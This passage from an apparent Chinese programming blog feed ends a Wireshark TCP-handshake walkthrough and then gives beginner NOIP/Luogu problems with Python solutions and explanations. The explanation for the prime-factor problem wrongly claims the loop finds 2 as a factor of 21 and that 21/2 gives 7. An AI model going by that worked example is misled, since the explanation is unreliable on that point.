<p>图中可以看到 wireshark 截获到了三次握手的三个数据包。第四个包才是 HTTPS 的， 这说明 HTTPS 的确是使用 TCP 建立连接的。</p>
<h4 id="第一次握手数据包"><a href="#第一次握手数据包" class="headerlink" title="第一次握手数据包"></a>第一次握手数据包</h4><p>客户端发送一个 TCP，标志位为 SYN，序列号为 0， 代表客户端请求建立连接。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-76c94415a9c1885e6a58030c2a5f18e7_r.jpg"
                      alt="img"
                ></p>
<p>数据包的关键属性如下：</p>
<p>SYN ：标志位，表示请求建立连接</p>
<p>Seq &#x3D; 0 ：初始建立连接值为 0，数据包的相对序列号从 0 开始，表示当前还没有发送数据</p>
<p>Ack &#x3D; 0：初始建立连接值为 0，已经收到包的数量，表示当前没有接收到数据</p>
<h4 id="第二次握手的数据包"><a href="#第二次握手的数据包" class="headerlink" title="第二次握手的数据包"></a>第二次握手的数据包</h4><p>服务器发回确认包, 标志位为 SYN，ACK。将确认序号(Acknowledgement Number)字段+1，即 0+1 &#x3D; 1。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-5e10999f4d16cb9c8a89db1cf19d6bf5_r.jpg"
                      alt="img"
                ></p>
<p>数据包的关键属性如下：</p>
<p>SYN + ACK: 标志位，同意建立连接，并回送 SYN+ACK</p>
<p>Seq &#x3D; 0 ：初始建立值为 0，表示当前还没有发送数据</p>
<p>Ack &#x3D; 1：表示当前端成功接收的数据位数，虽然客户端没有发送任何有效数据，确认号还是被加 1，因为包含 SYN 或 FIN 标志位。（并不会对有效数据的计数产生影响，因为含有 SYN 或 FIN 标志位的包并不携带有效数据）</p>
<h4 id="第三次握手的数据包"><a href="#第三次握手的数据包" class="headerlink" title="第三次握手的数据包"></a>第三次握手的数据包</h4><p>客户端再次发送确认包(ACK) SYN 标志位为 0，ACK 标志位为 1。并且把服务器发来 ACK 的序号字段+1，放在确定字段中发送给对方，并且在 Flag 段写 ACK 的+1：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-49d8a5ce01007e746892326e861a9636_r.jpg"
                      alt="img"
                ></p>
<p>数据包的关键属性如下：</p>
<p>ACK ：标志位，表示已经收到记录</p>
<p>Seq &#x3D; 1 ：表示当前已经发送 1 个数据</p>
<p>Ack &#x3D; 1 : 表示当前端成功接收的数据位数，虽然服务端没有发送任何有效数据，确认号还是被加 1，因为包含 SYN 或 FIN 标志位（并不会对有效数据的计数产生影响，因为含有 SYN 或 FIN 标志位的包并不携带有效数据)。</p>
<p>就这样通过了 TCP 三次握手，建立了连接。开始进行数据交互</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-d2f8b437bf8ed377e809cd338707a98a_r.jpg"
                      alt="img"
                ></p>
<h2 id="Wireshark-分析常用操作"><a href="#Wireshark-分析常用操作" class="headerlink" title="Wireshark 分析常用操作"></a>Wireshark 分析常用操作</h2><h3 id="导出数据包-1"><a href="#导出数据包-1" class="headerlink" title="导出数据包"></a>导出数据包</h3><p>调整数据包列表中时间戳显示格式。调整方法为 视图 –&gt; 时间显示格式 –&gt; 日期和时间。调整后格式如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Wireshark/v2-e3ae25306486c14d4942963c63350563_r.jpg"
                      alt="img"
                ></p>
<blockquote>
<p>参考链接：</p>
<p><a href="https://blog.w1ndys.top/posts/2d075872">https://blog.w1ndys.top/posts/2d075872</a></p>
<p><a class="link"   href="https://zhuanlan.zhihu.com/p/631821119#/" >https://zhuanlan.zhihu.com/p/631821119#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/linyfeng/p/9496126.html#/" >https://www.cnblogs.com/linyfeng/p/9496126.html#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://blog.csdn.net/zzwwhhpp/article/details/113077747#/" >https://blog.csdn.net/zzwwhhpp/article/details/113077747#/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF入门指北</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Wireshark</tag>
        <tag>CTF_tools</tag>
      </tags>
  </entry>
  <entry>
    <title>[NOIP2004 普及组] 不高兴的津津</title>
    <url>/posts/59f2a0b4.html</url>
    <content><![CDATA[<h1 id="NOIP2004-普及组-不高兴的津津"><a href="#NOIP2004-普及组-不高兴的津津" class="headerlink" title="[NOIP2004 普及组] 不高兴的津津"></a>[NOIP2004 普及组] 不高兴的津津</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>津津上初中了。妈妈认为津津应该更加用功学习，所以津津除了上学之外，还要参加妈妈为她报名的各科复习班。另外每周妈妈还会送她去学习朗诵、舞蹈和钢琴。但是津津如果一天上课超过八个小时就会不高兴，而且上得越久就会越不高兴。假设津津不会因为其它事不高兴，并且她的不高兴不会持续到第二天。请你帮忙检查一下津津下周的日程安排，看看下周她会不会不高兴；如果会的话，哪天最不高兴。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入包括 $7$ 行数据，分别表示周一到周日的日程安排。每行包括两个小于 $10$ 的非负整数，用空格隔开，分别表示津津在学校上课的时间和妈妈安排她上课的时间。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个数字。如果不会不高兴则输出 $0$，如果会则输出最不高兴的是周几（用 $1, 2, 3, 4, 5, 6, 7$ 分别表 示周一，周二，周三，周四，周五，周六，周日）。如果有两天或两天以上不高兴的程度相当，则输出时间最靠前的一天。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5 3</span><br><span class="line">6 2</span><br><span class="line">7 2</span><br><span class="line">5 3</span><br><span class="line">5 4</span><br><span class="line">0 4</span><br><span class="line">0 6</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>NOIP2004 普及组第 1 题</p>
<ul>
<li>2021-10-27：增加一组 hack 数据</li>
<li>2022-06-05：又增加一组 hack 数据</li>
</ul>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a1 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a2 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a3 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a4 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a5 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a6 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a7 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line"><span class="keyword">if</span> a1[<span class="number">0</span>] + a1[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> a2[<span class="number">0</span>] + a2[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> a3[<span class="number">0</span>] + a3[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> a4[<span class="number">0</span>] + a4[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="number">4</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> a5[<span class="number">0</span>] + a5[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="number">5</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">if</span> a6[<span class="number">0</span>] + a6[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="number">6</span>)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        <span class="keyword">if</span> a7[<span class="number">0</span>] + a7[<span class="number">1</span>] &gt; <span class="number">8</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="number">7</span>)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="built_in">print</span>(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>第一次我是这么做的，发现有一个没通过，检查一下发现是漏了一个条件，要输出最不高兴的，所以还要做一个时间的判断</p>
<p>改进一下代码</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">a1 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a2 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a3 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a4 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a5 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a6 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">a7 = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split()))</span><br><span class="line">max_hours = <span class="number">0</span></span><br><span class="line">max_day = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> a1[<span class="number">0</span>] + a1[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a1[<span class="number">0</span>] + a1[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a2[<span class="number">0</span>] + a2[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a2[<span class="number">0</span>] + a2[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a3[<span class="number">0</span>] + a3[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a3[<span class="number">0</span>] + a3[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a4[<span class="number">0</span>] + a4[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a4[<span class="number">0</span>] + a4[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a5[<span class="number">0</span>] + a5[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a5[<span class="number">0</span>] + a5[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a6[<span class="number">0</span>] + a6[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a6[<span class="number">0</span>] + a6[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> a7[<span class="number">0</span>] + a7[<span class="number">1</span>] &gt; max_hours:</span><br><span class="line">    max_hours = a7[<span class="number">0</span>] + a7[<span class="number">1</span>]</span><br><span class="line">    max_day = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> max_hours &lt;= <span class="number">8</span>:</span><br><span class="line">    max_day = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(max_day)</span><br><span class="line"><span class="comment">###下雪了</span></span><br></pre></td></tr></table></figure></div>

<p>完美AC</p>
<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这段代码首先从标准输入读取7行输入，每行包含两个整数，用空格分隔。这些输入分别存储在a1到a7的列表中。</p>
<p>然后，通过比较每一天的工作小时数（列表中的两个整数之和），找到工作最多的一天，并记录该天的索引。索引从1开始，表示一周中的第几天。</p>
<p>最后，如果最大工作小时数不超过8小时，则将max_day设置为0，表示一周中没有超过8小时的工作日。</p>
<p>最终输出的是最大工作小时数超过8小时的那一天的索引（从1到7），或者如果所有天的工作小时数都不超过8小时，则输出0。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>复习一下读取输入的知识</p>
<p>CSDN发现一个大佬写的，搬运一下</p>
<p><a class="link"   href="https://blog.csdn.net/m0_46204224/article/details/109049999#/Input_44" >https://blog.csdn.net/m0_46204224/article/details/109049999#/Input_44<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>	</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>[NOIP2005 普及组] 校门外的树</title>
    <url>/posts/49ac50d6.html</url>
    <content><![CDATA[<h1 id="NOIP2005-普及组-校门外的树"><a href="#NOIP2005-普及组-校门外的树" class="headerlink" title="[NOIP2005 普及组] 校门外的树"></a>[NOIP2005 普及组] 校门外的树</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>某校大门外长度为 $l$ 的马路上有一排树，每两棵相邻的树之间的间隔都是 $1$ 米。我们可以把马路看成一个数轴，马路的一端在数轴 $0$ 的位置，另一端在 $l$ 的位置；数轴上的每个整数点，即 $0,1,2,\dots,l$，都种有一棵树。</p>
<p>由于马路上有一些区域要用来建地铁。这些区域用它们在数轴上的起始点和终止点表示。已知任一区域的起始点和终止点的坐标都是整数，区域之间可能有重合的部分。现在要把这些区域中的树（包括区域端点处的两棵树）移走。你的任务是计算将这些树都移走后，马路上还有多少棵树。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行有两个整数，分别表示马路的长度 $l$ 和区域的数目 $m$。</p>
<p>接下来 $m$ 行，每行两个整数 $u, v$，表示一个区域的起始点和终止点的坐标。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行一个整数，表示将这些树都移走后，马路上剩余的树木数量。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">500 3</span><br><span class="line">150 300</span><br><span class="line">100 200</span><br><span class="line">470 471</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">298</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【数据范围】</strong></p>
<ul>
<li>对于 $20%$ 的数据，保证区域之间没有重合的部分。</li>
<li>对于 $100%$ 的数据，保证 $1 \leq l \leq 10^4$，$1 \leq m \leq 100$，$0 \leq u \leq v \leq l$。</li>
</ul>
<p><strong>【题目来源】</strong></p>
<p>NOIP 2005 普及组第二题</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">int_values = <span class="built_in">input</span>().split()</span><br><span class="line">int_values = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, int_values))</span><br><span class="line">list1 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(int_values[<span class="number">0</span>] + <span class="number">1</span>):</span><br><span class="line">    list1.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(int_values[<span class="number">1</span>]):</span><br><span class="line">    a, b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(a, b + <span class="number">1</span>):</span><br><span class="line">        list1[j] = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(int_values[<span class="number">0</span>] + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> list1[i] == <span class="number">1</span>:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><ol>
<li><code>int_values = input().split()</code>: 从标准输入中读取一行字符串，使用 <code>split()</code> 方法将其拆分为字符串列表，例如 <code>[&#39;500&#39;, &#39;3&#39;]</code>。</li>
<li><code>int_values = list(map(int, int_values))</code>: 将字符串列表中的每个元素转换为整数，得到 <code>[500, 3]</code>。</li>
<li><code>list1 = []</code>: 初始化一个空列表，该列表将表示整条道路上的树木分布。</li>
<li><code>for i in range(int_values[0] + 1): list1.append(1)</code>: 使用循环，将长度为 <code>l + 1</code> 的列表初始化为 1，其中 <code>l</code> 是道路的长度。</li>
<li><code>for i in range(int_values[1]): a, b = map(int, input().split())</code>: 从输入中读取区域的起始点和终止点，并将其转换为整数。</li>
<li><code>for j in range(a, b + 1): list1[j] = 0</code>: 将区域内的树木移除，将相应的元素设置为 0。</li>
<li><code>count = 0</code>: 初始化一个计数器，用于计算剩余的树木数量。</li>
<li><code>for i in range(int_values[0] + 1): if list1[i] == 1: count += 1</code>: 遍历整个列表，统计值为 1 的元素的数量，即剩余的树木数量。</li>
<li><code>print(count)</code>: 输出最终的树木数量。</li>
</ol>
<p>另外要注意，0-l 是长度，但是要生成的列表大小是 l+1，因为包含 0，实际个数比长度多一个</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>list 初始化是空列表，需要 append 添加元素，不要用 list 来命名一个列表</p>
<p><code>a, b = map(int, input().split())</code> 可以用这种写法来实现多变量存储</p>
<p>list 计数的方法还有 list.count()</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>[NOIP2005 普及组] 陶陶摘苹果</title>
    <url>/posts/235be58.html</url>
    <content><![CDATA[<h1 id="NOIP2005-普及组-陶陶摘苹果"><a href="#NOIP2005-普及组-陶陶摘苹果" class="headerlink" title="[NOIP2005 普及组] 陶陶摘苹果"></a>[NOIP2005 普及组] 陶陶摘苹果</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>陶陶家的院子里有一棵苹果树，每到秋天树上就会结出 $10$ 个苹果。苹果成熟的时候，陶陶就会跑去摘苹果。陶陶有个 $30$ 厘米高的板凳，当她不能直接用手摘到苹果的时候，就会踩到板凳上再试试。</p>
<p>现在已知 $10$ 个苹果到地面的高度，以及陶陶把手伸直的时候能够达到的最大高度，请帮陶陶算一下她能够摘到的苹果的数目。假设她碰到苹果，苹果就会掉下来。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入包括两行数据。第一行包含 $10$ 个 $100$ 到 $200$ 之间（包括 $100$ 和 $200$ ）的整数（以厘米为单位）分别表示 $10$ 个苹果到地面的高度，两个相邻的整数之间用一个空格隔开。第二行只包括一个 $100$ 到 $120$ 之间（包含 $100$ 和 $120$ ）的整数（以厘米为单位），表示陶陶把手伸直的时候能够达到的最大高度。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出包括一行，这一行只包含一个整数，表示陶陶能够摘到的苹果的数目。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">100 200 150 140 129 134 167 198 200 111</span><br><span class="line">110</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p><strong>【题目来源】</strong></p>
<p>NOIP 2005 普及组第一题</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">int_values = <span class="built_in">input</span>().split()</span><br><span class="line">int_values = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, int_values))</span><br><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> int_values:</span><br><span class="line">    <span class="keyword">if</span> a &gt;= i <span class="keyword">or</span> (a + <span class="number">30</span>) &gt;= i:</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(count)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><blockquote>
<p>来自 ChatGPT</p>
</blockquote>
<p>题目描述是关于陶陶摘苹果的问题，其中给出了苹果到地面的高度和陶陶把手伸直的最大高度。陶陶能够摘到苹果的条件是，苹果的高度小于等于陶陶把手伸直的高度，或者小于等于陶陶把手伸直高度再加上板凳的高度（30 厘米）。</p>
<ol>
<li><p><code>input().split()</code>: 这行代码读取 10 个苹果到地面的高度，将其分割成一个整数列表 <code>int_values</code>。</p>
</li>
<li><p><code>int_values = list(map(int, int_values))</code>: 转换 <code>int_values</code> 中的字符串为整数，以便进行后续的比较。</p>
</li>
<li><p><code>a = int(input())</code>: 读取陶陶把手伸直的最大高度。</p>
</li>
<li><p><code>count = 0</code>: 初始化计数器为 0，用于统计陶陶能够摘到的苹果数量。</p>
</li>
<li><p><code>for i in int_values:</code>: 对于每个苹果的高度，进行以下检查。</p>
</li>
<li><p><code>if a &gt;= i or (a + 30) &gt;= i:</code>: 如果陶陶能够摘到这个苹果（即苹果的高度小于等于陶陶把手伸直的高度或者小于等于陶陶把手伸直高度再加上板凳的高度），则增加计数器。</p>
</li>
<li><p><code>print(count)</code>: 打印最终计数器的值，即陶陶能够摘到的苹果的数量。</p>
</li>
</ol>
<p>根据样例输入和输出，这个问题中的代码将输出符合条件的苹果数量，即陶陶能够摘到的苹果的数目。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int_values = input().split()</span><br><span class="line">int_values = list(map(int, int_values))</span><br></pre></td></tr></table></figure></div>

<p>用来读取连续输入，空格间隔的数据</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>[NOIP2012 普及组] 质因数分解</title>
    <url>/posts/98088128.html</url>
    <content><![CDATA[<h1 id="NOIP2012-普及组-质因数分解"><a href="#NOIP2012-普及组-质因数分解" class="headerlink" title="[NOIP2012 普及组] 质因数分解"></a>[NOIP2012 普及组] 质因数分解</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知正整数 $n$ 是两个不同的质数的乘积，试求出两者中较大的那个质数。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入一个正整数 $n$。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一个正整数 $p$，即较大的那个质数。</p>
<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">21</span><br></pre></td></tr></table></figure></div>

<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">7</span><br></pre></td></tr></table></figure></div>

<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><p>$1 \le n\le 2\times 10^9$</p>
<p>NOIP 2012 普及组 第一题</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">i = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> i &lt;= math.sqrt(n):</span><br><span class="line">    <span class="keyword">if</span> n % i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(n / i))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="题解解释"><a href="#题解解释" class="headerlink" title="题解解释"></a>题解解释</h2><p>这道题要求解一个正整数 $n$，该整数是两个不同质数的乘积。你需要找出这两个质数中较大的那个，并输出。</p>
<p>解题思路：</p>
<ol>
<li>首先导入math库。</li>
<li>通过循环，从 $i&#x3D;2$ 开始逐步增加 $i$ 的值，直到 $i$ 大于等于 $n$ 的平方根。</li>
<li>在循环中，检查是否 $n$ 能被 $i$ 整除，如果是，则说明找到了一个质因数，即 $i$。</li>
<li>输出 $n$ 除以 $i$ 的结果，即较大的那个质数。</li>
</ol>
<p>在给定的代码中，如果输入是21，那么循环会找到2是21的一个因数，然后输出21除以2的结果，即7。因此，输出为7，是较大的那个质数。</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>找质因数的时候，可以用平方根来提高查找速率</p>
]]></content>
      <categories>
        <category>Python</category>
        <category>蓝桥</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>蓝桥</tag>
        <tag>洛谷</tag>
      </tags>
  </entry>
  <entry>
    <title>[NOIP2002 普及组] 级数求和</title>
    <url>/posts/6a1bb740.html</url>
    <content><![CDATA[<h1 id="NOIP2002-普及组-级数求和"><a href="#NOIP2002-普及组-级数求和" class="headerlink" title="[NOIP2002 普及组] 级数求和"></a>[NOIP2002 普及组] 级数求和</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>已知：$S_n&#x3D; 1+\dfrac{1}{2}+\dfrac{1}{3}+…+\dfrac{1}{n}$。显然对于任意一个整数 $k$，当 $n$ 足够大的时候， $S_n&gt;k$。</p>
<p>现给出一个整数 $k$，要求计算出一个最小的 $n$，使得 $S_n&gt;k$。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>一个正整数 $k$。</p>
